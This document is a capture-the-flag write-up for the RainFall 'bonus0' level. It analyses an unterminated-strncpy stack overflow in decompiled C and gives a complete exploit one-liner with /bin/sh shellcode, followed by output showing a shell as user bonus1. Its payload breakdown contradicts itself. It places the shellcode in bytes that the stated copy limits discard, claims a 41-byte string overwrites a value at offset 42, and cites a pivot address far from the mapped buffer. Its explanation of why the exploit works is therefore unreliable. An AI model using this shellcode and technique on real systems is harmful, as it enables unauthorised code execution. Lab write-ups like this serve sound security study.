<h1 align="center"> BONUS 0 </h1>

## 🔍 Analysis of Decompiled [bonus0](./source.c)
### Initial Execution
```bash
bonus0@RainFall:~$ ./bonus0
 - 
test1
 - 
test2
test1 test2
```

The binary prompts for two inputs,and concatenates them with a space, and prints the combined result.

### Vulnerability Assessment

The vulnerability lies in the interaction between three key functions:

#### `p` Function - Input Handler
```c
char *p(char *dest, char *s) {
  char buf[4104];
  puts(s);
  read(0, buf, 0x1000);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 0x14);  // Only copies 20 bytes
}
```
- Reads up to 4096 bytes but only copies 20 bytes to destination
- **Critical**: `strncpy` may not null-terminate if input is exactly 20 bytes

#### `pp` Function - String Concatenation
```c
char *pp(char *dest) {
  char src[20];   // First input buffer
  char v3[20];    // Second input buffer
  
  p(src, " - ");
  p(v3, " - ");
  
  strcpy(dest, src);         // Unbounded copy
  *(_WORD *)&dest[strlen(dest)] = unk_80486A4;   // space
  return strcat(dest, v3);  //  Unbounded append
}
```

#### `main` Function
```c
int main() {
  char combined[42];  // Target buffer - only 42 bytes!
  pp(combined);
  puts(combined);
  return 0;
}
```

### The Vulnerability Chain

1. **Unterminated Strings**: If either input is exactly 20 bytes or more, `strncpy` won't null-terminate the destination
2. **Unbounded Operations**: `strcpy` and `strcat` rely on null terminators to know when to stop
3. **Memory Overread**: Without null terminators, these functions read past buffer boundaries
4. **Stack Overflow**: The resulting concatenated string overflows the 42-byte `combined` buffer

## Stack Layout Analysis

Using GDB to map the stack structure:

```
Stack Layout (from GDB analysis):
┌─────────────────────────┐
│  combined[42]           │ ← 0xbffff70e (start)
├─────────────────────────┤
│  ... stack data ...     │
├─────────────────────────┤
│  saved EBP              │ ← 0xbffff738 (combined + 42)
├─────────────────────────┤
│  saved EIP (ret addr)   │ ← 0xbffff73c (combined + 46)
└─────────────────────────┘
```

**Key Addresses** (from GDB session):
- `combined` starts at: `0xbffff70e`
- `saved EBP` at: `0xbffff738` (42 bytes offset)
- `saved EIP` at: `0xbffff73c` (46 bytes offset)

## Exploitation Technique

### Stack Pivot Attack

The exploit uses a classic **stack pivot** technique:

1. **Overwrite saved EBP**: Replace it with an address pointing to our shellcode
2. **Leverage `leave` instruction**: `leave` does `mov esp, ebp; pop ebp`
   - Sets `esp` to our controlled address (the overwritten saved EBP)
3. **Control execution**: Subsequent `ret` pops from our controlled stack location

### Payload Construction

The exploit requires careful payload crafting:

**First Input** (20 bytes):
- Fill with NOPs (`\x90`) to create a landing pad
- Include shellcode for `/bin/sh` execution

**Second Input** (20 bytes):
- Padding to reach saved EBP offset
- Target address (little-endian) to pivot execution
- Additional NOPs for stability

## Working Exploit

```bash
(python -c 'print("A"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'; python -c 'print("A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 8)'; cat) | ./bonus0
```

### Payload Breakdown

**First Input Analysis**:
- 50 A's + 24-byte shellcode = 74 bytes total
- `strncpy` caps at 20 bytes → only first 20 A's copied to `src`

**Second Input Analysis**:
- 9 A's + `\xd0\xe6\xff\xbf` (pivot address) + 8 B's = 21 bytes
- `strncpy` caps at 20 bytes → 9 A's + pivot address + 7 B's

**Concatenation Result**:
```
combined[42]: [20 A's] + [space] + [9 A's] + [pivot_addr] + [7 B's] = 41 bytes
```

This precisely overwrites `saved EBP` at offset 42 with our pivot address `0xbfffe6d0`.


## Exploitation Results

```bash
$ (python -c 'print("A"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'; python -c 'print("A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 8)'; cat) | ./bonus0

whoami
bonus1
```
